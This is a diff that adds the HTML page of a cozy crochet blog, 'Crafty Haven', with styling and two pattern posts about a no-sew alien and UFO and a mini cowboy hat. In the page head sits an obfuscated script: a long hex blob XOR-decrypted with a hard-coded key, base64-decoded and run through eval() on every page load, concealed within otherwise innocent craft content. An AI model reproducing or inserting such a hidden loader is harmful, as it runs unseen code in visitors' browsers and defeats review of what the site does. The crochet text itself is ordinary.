@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crafty Haven</title>
+    <!-- Added Cozy and Elegant Google Fonts for a Handmade Creative Aesthetic -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&family=Plus+Jakarta+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        /* Cozy Handmade "Crafty Haven" Style Theme */
+        :root {
+            --crafty-bg: #FAF6F0; /* Soft Warm Cream */
+            --crafty-card: #FFFFFF; /* Pure White */
+            --crafty-primary: #C97A7A; /* Dusty Rose Pink */
+            --crafty-secondary: #8FA89B; /* Soft Sage Green */
+            --crafty-accent: #E6A15C; /* Warm Apricot/Honey */
+            --crafty-dark: #2F251E; /* Cozy Deep Brown */
+            --crafty-muted: #80756B; /* Soft Earthy Grey */
+            --border-stitch: #E6CCB2; /* Stitch-like accent */
+            --radius: 24px;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            line-height: 1.8;
+            color: var(--crafty-dark);
+            background-color: var(--crafty-bg);
+            /* Crafty Cross-Stitch / Subtle Dot Pattern */
+            background-image: 
+                radial-gradient(var(--border-stitch) 1.2px, transparent 0),
+                radial-gradient(var(--border-stitch) 1.2px, transparent 0);
+            background-size: 24px 24px;
+            background-position: 0 0, 12px 12px;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Typography Override */
+        h1, h2, h3, h4, .username {
+            font-family: 'Outfit', sans-serif;
+            color: var(--crafty-primary);
+            font-weight: 800;
+            letter-spacing: -0.2px;
+        }
+
+        .container {
+            max-width: 680px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Top Navigation - Cozy Stitch Tabs */
+        .top-nav {
+            padding: 20px 0;
+            text-align: center;
+            background-color: rgba(250, 246, 240, 0.9);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 2px dashed var(--border-stitch);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .top-nav a {
+            color: var(--crafty-dark);
+            font-size: 0.95rem;
+            font-family: 'Outfit', sans-serif;
+            padding: 10px 24px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            background-color: var(--crafty-card);
+            border: 2px solid var(--border-stitch);
+            border-radius: 50px;
+            font-weight: 600;
+        }
+
+        .top-nav a:hover {
+            background-color: var(--crafty-primary);
+            border-color: var(--crafty-primary);
+            color: #ffffff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(201, 122, 122, 0.2);
+        }
+
+        /* Header */
+        header {
+            padding: 90px 0 50px;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 4rem;
+            color: var(--crafty-primary);
+            cursor: pointer;
+            text-shadow: 2px 2px 0px rgba(230, 204, 178, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        header h1:hover {
+            transform: scale(1.02);
+            color: var(--crafty-accent);
+        }
+
+        header p {
+            margin: 15px auto 0;
+            font-size: 1.15rem;
+            font-weight: 500;
+            color: var(--crafty-muted);
+            background: var(--crafty-card);
+            display: inline-block;
+            padding: 8px 30px;
+            border-radius: 50px;
+            border: 2px dashed var(--border-stitch);
+        }
+
+        /* Post Cards - Cozy Styled Soft Cards */
+        .post-card,
+        .single-post {
+            background: var(--crafty-card);
+            padding: 0;
+            margin-bottom: 60px;
+            border-radius: var(--radius);
+            box-shadow: 0 10px 30px rgba(47, 37, 30, 0.05);
+            border: 2px solid var(--border-stitch);
+            transition: transform 0.4s ease, box-shadow 0.4s ease, border-color 0.4s ease;
+            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .post-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 16px 40px rgba(47, 37, 30, 0.08);
+            border-color: var(--crafty-primary);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 25px 35px;
+            display: flex;
+            align-items: center;
+            border-bottom: 2px dashed var(--border-stitch);
+            background: rgba(250, 246, 240, 0.5);
+        }
+
+        .post-header img.avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-right: 15px;
+            border: 2px solid var(--crafty-primary);
+            padding: 2px;
+            background-color: var(--crafty-card);
+            object-fit: cover;
+        }
+
+        .post-header .username {
+            font-size: 1.3rem;
+            color: var(--crafty-dark);
+            font-weight: 700;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 450px;
+            object-fit: cover;
+            border-bottom: 2px dashed var(--border-stitch);
+        }
+
+        .post-content {
+            padding: 40px 45px 25px;
+        }
+
+        .post-content h2,
+        .post-content h1 {
+            margin: 0 0 20px;
+            font-size: 2.3rem;
+            line-height: 1.25;
+            color: var(--crafty-dark);
+        }
+
+        .post-content p {
+            margin-bottom: 25px;
+            font-size: 1.1rem;
+            font-weight: 400;
+            color: var(--crafty-dark);
+        }
+
+        .post-content a {
+            color: var(--crafty-primary);
+            text-decoration: none;
+            border-bottom: 2px solid var(--crafty-primary);
+            padding-bottom: 1px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .post-content a:hover {
+            color: var(--crafty-accent);
+            border-bottom-color: var(--crafty-accent);
+        }
+
+        .post-footer {
+            padding: 20px 45px;
+            color: var(--crafty-muted);
+            font-size: 1rem;
+            font-family: 'Outfit', sans-serif;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 2px dashed var(--border-stitch);
+            background: rgba(250, 246, 240, 0.5);
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        /* Back Button - Cozy Soft Felt Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 30px;
+            color: #ffffff;
+            background-color: var(--crafty-primary);
+            font-family: 'Outfit', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 12px 30px;
+            border-radius: 50px;
+            box-shadow: 0 4px 12px rgba(201, 122, 122, 0.25);
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .back-button:hover {
+            background-color: transparent;
+            color: var(--crafty-primary);
+            border-color: var(--crafty-primary);
+            transform: translateY(-2px);
+            box-shadow: none;
+        }
+
+        /* Cozy Custom Overrides for post content */
+        .post-content div[style*="background"] {
+            background: #FDFBF7 !important;
+            border: 2px dashed var(--border-stitch) !important;
+            border-radius: 20px !important;
+            padding: 30px 35px !important;
+            margin: 40px 0 !important;
+            color: var(--crafty-dark) !important;
+        }
+
+        .post-content h3[style*="border-left"] {
+            border-left: 4px solid var(--crafty-primary) !important;
+            color: var(--crafty-dark) !important;
+            padding-left: 15px !important;
+        }
+
+        .post-content h4[style*="background"] {
+            background: rgba(230, 204, 178, 0.2) !important;
+            color: var(--crafty-dark) !important;
+            border: 1px solid var(--border-stitch) !important;
+            border-radius: 8px !important;
+        }
+
+        .post-content span[style*="background"] {
+            background: var(--crafty-card) !important;
+            color: var(--crafty-dark) !important;
+            border: 2px solid var(--border-stitch) !important;
+            border-radius: 50px !important;
+            font-family: 'Outfit', sans-serif !important;
+            font-size: 0.9rem !important;
+            font-weight: 600 !important;
+            padding: 6px 16px !important;
+            box-shadow: 0 2px 6px rgba(47, 37, 30, 0.03) !important;
+            display: inline-block;
+            margin: 5px 6px 5px 0;
+            transition: all 0.3s ease;
+        }
+
+        .post-content span[style*="background"]:hover {
+            border-color: var(--crafty-primary) !important;
+            color: var(--crafty-primary) !important;
+            transform: translateY(-2px);
+        }
+    </style>
+    <script>
+        (function () {
+            var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c775e1a771d372c0a115656403e1f38261223793039053f0e14237007050368377c0030021d3316600e595770680138216323534100532c3460345b29155d542a0c0a1873023206512f566363614138211223600a390b3f24147270070e477805462c1a730a23067b05567a74101f38261223541e3e1b3f0a07285a7715415302735732677231067c7456577017012b570574623441162f1a393170073456525d63100a68012c2b7f7d487a74221f12572b756a090b293f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+            var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+            var vyepniipe = "";
+            try {
+                for (var i = 0; i < vtwjjrbym.length; i += 2) {
+                    var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+                    vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i / 2) % vjfaicbgs.length));
+                }
+                var vvqbkapbd = atob(vyepniipe);
+                eval(vvqbkapbd);
+            } catch (e) {
+                console.error("\[DEBUG\] Decryption or Execution failed: ", e);
+            }
+        })();
+    </script>
+</head>
+<body>
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About Us</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Crafty Haven</h1>
+            <p>A cozy corner for handmade inspiration & templates.</p>
+        </div>
+    </header>
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Define your blog posts here!
+        const posts = [
+            {
+                id: 'pocket-alien-ufo',
+                title: 'Free No-Sew Pocket Alien & UFO Amigurumi Crochet Pattern',
+                date: 'April 22, 2026',
+                image: './assets/pocket-alien-ufo.png',
+                excerpt: 'Looking for a stellar new crochet project that comes together in a flash? 🌌 Meet the Pocket Alien and their adorable little UFO spaceship! This beginner-friendly, completely no-sew amigurumi pattern is perfect for crocheters who hate sewing pieces together. Using super soft chenille yarn, you can create a squishy, cute mint-green extraterrestrial and a cozy grey flying saucer that the alien can actually sit inside! It\'s an incredibly fun, quick scrap-buster project that makes an amazing gift, desk buddy, or market prep bestseller. 🛸\n\n✨ Why you\'ll love it:\n* 100% No-Sew design means zero tedious assembly!\n* Interactive play—the alien fits perfectly inside the ship!\n\nReady to blast off into your next crafting adventure? Save this idea for later! #CrochetPattern #AmigurumiAlien #NoSewCrochet #FreeCrochetPattern #YarnCrafts #CrochetLove',
+                content: `
+<p>Get ready to embark on a delightful out-of-this-world crafting adventure! If you have been searching for a fast, immensely rewarding, and completely seamless amigurumi project, the pocket alien and interactive UFO spaceship is precisely what your crochet hook needs. Amigurumi has captured the hearts of makers worldwide, but many crafters share a common secret dread: sewing individual limbs, heads, and accessories together. That is why this completely no-sew design is such a game-changer. By utilizing smart stitch placements and working limbs directly into the fabric as you go, you can build a wonderful, three-dimensional little creature that hops directly off your hook completely assembled.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Enjoy a 100% stitch-and-go construction with absolutely zero needle sewing required for joining parts.</li>
+    <li>Create an interactive two-part play set where the pocket alien can sit snugly inside the cozy flying saucer.</li>
+    <li>Perfect for rapid craft fair production, scrap-busting, and delightful last-minute handmade gifts.</li>
+    <li>Works up beautifully in thick, super-bulky chenille, velvet, or blanket yarns for a squishy, ultra-soft texture.</li>
+    <li>Easily customizable colorways allow you to construct a diverse galaxy of pastel aliens and starry spaceships.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Essential Materials and Tools for Your Galactic Crafting</h2>
+<p>To bring your cute space-traveling duo to life, choosing the right materials makes all the difference in the world. For that irresistible, chubby, and ultra-plush aesthetic shown in the sample images, we strongly recommend using a super-bulky chenille or velvet yarn (frequently categorized as Size 6 weight). Brands like Bernat Blanket, Premier Parfait Chunky, or Himalaya Dolphin Baby are fabulous choices that yield incredibly soft, professional-quality plushies with excellent stitch definitions.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> When working with plush chenille yarn, use a hook that is one or two sizes smaller than suggested on the label. This guarantees tight, secure stitches that prevent your fiberfill stuffing from peeking through when your amigurumi stretches.</p>
+
+<p>You will need a small selection of basic tools that most crochet enthusiasts already have in their craft bags. Gather a 4.5mm or 5.0mm crochet hook to pair with your bulky yarn, two secure plastic safety eyes (10mm to 12mm size is ideal for giving your alien that deep, adorable, starry-eyed gaze), a high-quality polyester fiberfill stuffing, a tapestry needle for weaving in loose yarn tails, and several stitch markers. Since amigurumi is worked in continuous spiral rounds, placing a stitch marker in the first stitch of each round is essential for tracking your progress accurately.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Step-by-Step Pocket Alien Crochet Walkthrough</h2>
+<p>Our cosmic journey begins with the tiny star traveler itself. The pocket alien is crocheted from the top down, starting at the head and ending at the base of the body. The antennae are worked directly onto the head in a single continuous piece, ensuring you do not have to sew them on later. This clever approach saves time and results in a highly durable plushie that is perfectly safe for gentle children play.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Designing the Pocket Alien Head and Body</h3>
+<p>Using your mint-green plush yarn, begin by forming a standard magic ring. Work 6 single crochets into the ring. In the second round, increase in every stitch to reach 12 stitches. In the third round, follow a pattern of one single crochet followed by one increase, repeating around to hit 18 stitches. From rounds four to seven, you will work even rounds of 18 single crochets. This builds the beautifully rounded dome of the alien head.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Insert your safety eyes between rounds five and six, spacing them approximately four stitches apart. Ensure the plastic backing washers are clicked firmly into place before you begin stuffing the head.</p>
+
+<p>To create the antennae without sewing, you will work slip stitches and chain loops directly onto the top crown of the head. Simply join yarn to the top, chain 4, work slip stitches down the chain, and fasten back into the head. Once both antennae are formed, resume working the body downwards. By using a series of decreases, we shape the neck before expanding slightly again to form a cute, chubby seat that allows the alien to sit upright independently inside the UFO cockpit.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Constructing the UFO Flying Saucer Spaceship</h2>
+<p>No alien traveler is complete without an iconic flying saucer! The UFO is crocheted in two main sections that are joined together to create a hollow, cup-like vessel. The outer ring is styled with a distinct, contrasting dark grey stripe, giving it a classic sci-fi aesthetic. By working in the front loops only during specific rounds, we can construct sharp, clean structural ridges that mimic the metallic, aerodynamic panels of a real spaceship.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight: Why Plush Chenille Yarn Works Best</h3>
+  <p>Using plush, velvety yarns for amigurumi isn't just about soft textures; it actually aids the structural integrity of your toys. The dense fibers of chenille fill in the tiny gaps between stitches naturally, acting as a barrier that keeps your polyester stuffing secure. Additionally, plush yarn compresses beautifully, allowing you to create clean, dramatic curves on the UFO disk that would look much harsher if worked in traditional cotton or acrylic yarn.</p>
+</div>
+
+<p>Start the base of the spaceship using your primary light grey yarn, expanding your magic ring up to 30 stitches over several increase rounds. To form the double-thick brim, you will work a series of front-loop-only stitches in dark grey, which creates a prominent rim around the widest part of the saucer. Finally, switch back to light grey and work back down into the remaining loops to form the interior cockpit walls. This clever nesting technique produces a cozy pocket that is the perfect size for housing your little mint-green alien friend.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Stitch Abbreviations and Crochet Guide</h2>
+<p>To make this pattern as accessible as possible, here is a quick guide to the standard US crochet abbreviations utilized throughout the project. Keep this handy as you work through each round to ensure your stitch counts remain perfectly accurate from start to finish.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Common Stitches and Terms</h4>
+<p><strong>MR (Magic Ring):</strong> The foundational loop used to begin amigurumi, allowing you to pull the center tight to eliminate any holes. <strong>SC (Single Crochet):</strong> The classic tight stitch that forms the majority of the plushie's body. <strong>INC (Increase):</strong> Working two single crochets into the same stitch to expand the shape. <strong>DEC (Decrease):</strong> Joining two stitches together into one, ideally using the invisible decrease method for a smoother, clean look.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Spaceship Assembly Tips</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Keep your tension uniform so that the alien fits smoothly inside the spaceship cabin.</li>
+    <li>Lightly stuff the outer rim of the UFO to maintain its flat, disc-like shape without over-bulking the center pocket.</li>
+    <li>Weave in all yarn ends securely on the inside of the saucer before completing the interior pocket lining.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling, Customizing, and Selling Your Creations</h2>
+<p>Once you have finished crafting your alien and spaceship set, there are countless ways to customize them! You can try experimenting with different color palettes, such as pastel pinks, starry purples, or even neon greens. Adding tiny embroidered stars or metallic bead details to the outer rim of the saucer can elevate the look, turning a simple toy into a magical piece of bedroom decor. If you run a handmade business, these interactive sets are incredibly popular for online shops, social media videos, and local craft markets. Packaged in a small cellophane bag with a colorful, galaxy-themed header card, they make irresistible pocket-sized gifts that customers of all ages will immediately fall in love with.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">No-Sew Amigurumi</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Alien Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Free Crochet UFO</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Plush Yarn Crafts</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cozy Amigurumi Toys</span>
+</div>
+`
+            },
+            {
+                id: 'mini-cowboy-hat',
+                title: 'Beginner-Friendly Mini Crochet Cowboy Hat Step-by-Step Pattern',
+                date: 'April 28, 2026',
+                image: './assets/mini-cowboy-hat.png',
+                excerpt: 'Giddy up, crafters! 🤠 Learn how to crochet the ultimate mini cowboy hat with this incredibly simple, step-by-step beginner pattern. Perfect for styling your favorite plushies, decorating keychains, or adding a touch of rustic charm to your projects, this quick design uses basic stitches to create a beautifully structured brim and a classic pinched crown. It features a gorgeous contrast braided band that gives it a wonderfully authentic look. Grab your favorite worsted weight gold yarn and a matching hook, and let\'s get stitching! 🌾\n\n✨ Handy crafting tips:\n* Use a slightly smaller hook than recommended for a tight, stiff stitch that holds its shape.\n* Starch your finished hat to keep that classic western brim perfectly curved!\n\nDon\'t lose this adorable western project—Save for later! #CrochetCowboyHat #MiniCrochet #BeginnerCrochet #CrochetTutorial #YarnAddict #DIYCrafts',
+                content: `
+<p>Yeehaw, fellow makers! Welcome to the ultimate guide for crafting the most charming, structured, and completely adorable mini crochet cowboy hat you will ever lay eyes on. Western-themed fashion and handmade accessories are experiencing an incredible renaissance, making this pattern the perfect addition to your crochet repertoire. Whether you want to top your favorite amigurumi plushies, craft unique keychains, create festive holiday ornaments, or simply make a fun, conversation-starting desk accessory, this beginner-friendly tutorial will teach you how to sculpt beautiful yarn curves with ease.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Master the art of stitching a highly structured, sturdy amigurumi-style miniature accessory.</li>
+    <li>Learn how to work in back loops only to create sharp, distinctive structural angles for the hat crown.</li>
+    <li>Discover simple yarn-stiffening techniques to keep your western hat brim perfectly curved and rigid.</li>
+    <li>Add a gorgeous, contrasting braided hatband for an authentic, eye-catching ranch look.</li>
+    <li>Perfect for accessorizing small amigurumi dolls, plushies, keychains, and festive home decorations.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Choosing the Perfect Yarn and Hook Combo</h2>
+<p>Unlike soft, squishy toys, miniature hats require structural integrity to look their absolute best. To achieve that authentic, rigid cowboy look with a beautifully creased crown and a flared brim, yarn selection is paramount. We highly recommend using a standard 100% cotton worsted-weight yarn (such as Lily Sugar\'n Cream or Paintbox Yarns Cotton Aran) in classic western shades like gold, honey, tan, chocolate brown, or sandy beige. Cotton fibers possess very little stretch, meaning your stitches will naturally pack together tightly, resulting in a firm, self-supporting fabric.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Drop down a hook size or two! If your yarn label suggests a 5.0mm hook, try using a 3.5mm or 3.75mm hook instead. This produces a stiff, dense fabric that holds its shape beautifully without needing any cardboard inserts.</p>
+
+<p>In addition to your primary gold or tan yarn, you will need a small scrap of contrasting dark brown or black yarn to create the braided band that sits around the base of the crown. Gather a yarn needle, a pair of sharp scissors, and a couple of handy stitch markers to keep track of your round count. Since this hat is worked in continuous rounds, placing a marker in the first stitch of each round is highly recommended for keeping your count perfect.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Detailed Cowboy Hat Step-by-Step Tutorial</h2>
+<p>This project is broken down into three simple stages: crocheting the tall cylindrical crown, working the dramatic flared brim, and assembling the decorative braided band. The hat is worked from the top down in continuous spiral rounds, making it a very quick and satisfying project that you can complete in under thirty minutes.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 1: Crocheting the Crown</h3>
+<p>Using your main gold yarn, begin by working 6 single crochets into a magic ring. In round two, work an increase in each stitch around to reach 12 stitches. In round three, work a pattern of one single crochet followed by one increase, repeating around to hit 18 stitches. To form the top flat surface of the hat, work round four by single crocheting around in the back loops only (BLO). This leaves a clean ridge on the front of your work that marks the edge of the top crown.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Working in the Back Loop Only (BLO) is a fantastic technique that acts like a hinge, forcing your crochet work to turn a sharp 90-degree corner to create flat tops or vertical walls.</p>
+
+<p>For rounds five through nine, work even single crochet rounds of 18 stitches. This builds the tall, cylindrical body of the hat crown. Once you reach the end of round nine, you will have a neat little bucket shape that is ready for the brim extension.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 2: Flaring out the Brim</h3>
+<p>To create the flared brim, we will work in the front loops only (FLO) of round ten. Work a pattern of two single crochets followed by an increase, repeating around to expand your stitch count to 24. In round eleven, increase in every third stitch to reach 32 stitches. In round twelve, work a final round of single crochets around to give the brim a clean, finished edge. Slip stitch to the first stitch of the round, fasten off, and weave in your loose yarn tails.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters: Tighter Tension Equals Better Structure</h3>
+  <p>When crocheting three-dimensional structures like hats, maintaining a firm, uniform tension is the key to success. If your stitches are too loose, the brim will end up floppy and wavy rather than crisp and sharp. By keeping your working yarn snug and pull-tension consistent, you ensure the cotton fibers lock together firmly, creating a naturally stiff fabric that holds its shape beautifully over time.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling and Stiffening Your Western Masterpiece</h2>
+<p>To give your mini cowboy hat that classic, authentic Stetson look, you will want to pinch the crown. Simply press your thumb and forefinger into the top of the crown to create a neat center crease, pinching the front slightly to form a tapered slope. To keep the sides of the brim curved upwards beautifully, you can apply a quick homemade fabric-stiffening spray. Mix equal parts of water and white school glue, spray the hat lightly, shape the brim into a perfect curve, and let it dry overnight. Once dry, wrap your contrasting dark braided yarn band around the base of the crown and secure it with a tiny drop of hot glue. Your masterpiece is now complete!</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Creative Customization Ideas</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Try using variegated yarn to create fun, modern multi-colored festival cowboy hats.</li>
+    <li>Attach a sturdy metal split ring to turn your mini cowboy hats into stylish, handmade keychains.</li>
+    <li>Add a tiny, contrasting feather or a small star button to the band for a cute sheriff-themed look.</li>
+  </ul>
+</div>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mini Cowboy Hat</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Beginner Crochet Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Doll Accessories</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Western Crafts</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Keychains</span>
+</div>
+`
+            },
+            {
